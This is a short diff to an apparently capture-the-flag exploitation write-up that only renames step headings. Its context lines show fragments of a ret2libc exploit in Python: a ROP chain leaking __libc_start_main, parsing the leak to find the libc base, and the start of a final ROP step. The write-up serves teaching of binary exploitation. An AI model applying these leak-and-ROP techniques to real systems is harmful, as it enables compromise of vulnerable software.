@@ -33,7 +33,7 @@ checksec reveal that PIE is enabled which explain the purpose of leaking the add
 
 The attack will be ret2libc but first we need to leak libc base using rop attack.
 
-1. step 1: leaking `__libc_start_main` address
+1. Step I: leaking `__libc_start_main` address
 
 ```python
 base_prog = MAIN - 0x864 # compute the program base address based on the main address printed out from the program
@@ -53,7 +53,7 @@ rop2 = padding +p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(RET) + p64(PRINTF) + p
 p.sendline(rop2)
 ```
 
-2. step 2: Parse the leaked address
+2. Step II: Parse the leaked address
 
 ```python
 recieved = p.recvline().strip().split('Give')
@@ -64,7 +64,7 @@ libc.address = leak - libc.sym["__libc_start_main"]
 log.info("Address of libc %s " % hex(libc.address))
 ``` 
 
-3. step 3: Create and send the final rop
+3. Step III: Create and send the final rop
 
 ```python
 
